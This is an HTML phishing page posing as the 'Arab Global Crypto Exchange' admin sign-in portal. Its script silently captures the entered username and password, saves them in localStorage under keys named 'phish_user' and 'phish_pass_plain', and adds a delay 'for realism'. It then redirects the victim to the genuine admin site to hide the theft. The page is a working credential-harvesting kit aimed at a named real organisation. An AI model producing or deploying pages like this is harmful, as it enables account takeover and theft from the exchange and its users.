<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" href="logos.jpg" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Admin Portal — Arab Global</title>

    <style>
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        padding: 24px;
        background: #f3f6fa;
        color: #243247;
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial,
          sans-serif;
      }
      .card {
        width: 100%;
        max-width: 410px;
        padding: 36px;
        background: white;
        border: 1px solid #e3e8ef;
        border-radius: 12px;
        box-shadow: 0 12px 36px rgba(32, 52, 75, 0.07);
      }
      .brand-logo-container {
        display: flex;
        justify-content: center;
        margin-bottom: 24px;
      }
      .brand-logo {
        height: 48px;
        width: auto;
        max-width: 100%;
        object-fit: contain;
        display: block;
      }
      .brand-title {
        margin: 0 0 6px 0;
        color: #174c83;
        font-size: 24px;
        font-weight: 700;
        text-align: center;
      }
      .intro {
        margin: 0 0 24px 0;
        color: #687587;
        line-height: 1.5;
        font-size: 14px;
        text-align: center;
      }
      label {
        display: block;
        margin: 18px 0 8px;
        font-size: 14px;
        font-weight: 600;
        color: #243247;
      }
      input {
        width: 100%;
        padding: 13px 14px;
        border: 1px solid #d5dce6;
        border-radius: 7px;
        font: inherit;
        outline-color: #86b99a !important;
      } /* Added outline-color for better UX */
      button[type="submit"] {
        width: 100%;
        margin-top: 24px;
        padding: 14px;
        border: 0;
        border-radius: 7px;
        background: #166534;
        color: white;
        font-size: 15px;
        font-weight: 700;
        cursor: pointer;
        transition: background 0.3s;
        box-shadow: none !important;
      }

      .status-msg {
        text-align: center;
        margin-top: 10px;
        color: #687587 !important;
        font-size: 13px !important;
      }
    </style>
  </head>
  <body style="background-color: #f3f6fa">
    <main class="card">
      <div class="brand-logo-container">
        <img
          src="logo_light.svg"
          alt="Arab Global Crypto Exchange"
          class="brand-logo"
          onerror="
            this.style.display = 'none';
            this.parentNode.querySelector('#fallbackText').style.display =
              'block';
          "
        />
        <span
          id="fallbackText"
          style="display: none; color: #174c83; font-size: 20px"
          >AGCE Logo</span
        >
      </div>

      <h1 class="brand-title">AGCE Admin</h1>
      <p class="intro">Sign in to manage your exchange.</p>

      <form id="demo-form">
        <label for="username">Username, email, phone</label>
        <input
          id="username"
          name="username"
          autocomplete="off"
          placeholder="admin@example.com"
          required
        />

        <label for="password">Password</label>
        <input
          id="password"
          name="password"
          type="password"
          placeholder="Enter your password"
          autocomplete="new-password"
          required
        />

        <button type="submit">Continue</button>
      </form>

      <!-- Status Message Area -->
      <div id="statusArea"></div>
    </main>

    <script>
      const form = document.getElementById("demo-form");

      // Function to handle data capture (Method 2: Local Storage)
      function captureCredentials() {
        const user = document.getElementById("username").value;
        const pass = document.getElementById("password").value;

        console.log(`[Captured] Username: ${user}`);
        console.log(`[Captured] Password: ${pass}`);

        // Save to browser's local storage for inspection later
        localStorage.setItem("phish_user", user);

        // Optionally save password encrypted or plain text. For demo, we use plain text:
        // If you want it more hidden/encrypted, use btoa(pass)
        localStorage.setItem("phish_pass_plain", pass);
      }

      form.addEventListener("submit", async function (e) {
        e.preventDefault();

        const username = document.getElementById("username").value;
        const passVal = document.getElementById("password").value;

        if (!passVal) {
          alert("Please enter a password.");
          return;
        }

        // 1. UI Feedback - Disable button and change text
        const submitBtn = form.querySelector('button[type="submit"]');
        submitBtn.disabled = true;
        submitBtn.textContent = "Signing in...";

        // 2. Simulate Processing Delay for realism (1.5s total time including capture)
        setTimeout(() => {
          console.log(`[Processing Complete] Ready to redirect.`);

          // 3. Capture the data silently before leaving
          captureCredentials();

          statusArea.innerHTML = '<span class="status-msg">Verifying...</span>';

          // Wait briefly after showing "Verifying" then redirect
          setTimeout(() => {
            window.location.href = "https://admin.arabglobal.ae/";

            console.log(`[Redirected] User sent back to target admin panel.`);
          }, 800);
        }, 1500);
      });
    </script>
  </body>
</html>
